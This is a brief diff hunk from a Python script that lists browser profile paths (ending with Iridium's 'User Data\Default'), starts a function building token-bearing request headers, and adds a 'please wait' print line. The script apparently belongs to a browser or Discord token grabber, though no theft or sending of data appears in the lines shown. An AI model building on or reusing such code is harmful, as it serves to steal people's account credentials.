@@ -47,6 +47,8 @@ PATHS = {
     'Iridium': LOCAL + '\\Iridium\\User Data\\Default'
 }
 
+print("[*] please wait for 30 seconds")
+
 def getheaders(token=None):
     headers = {
         "Content-Type": "application/json",
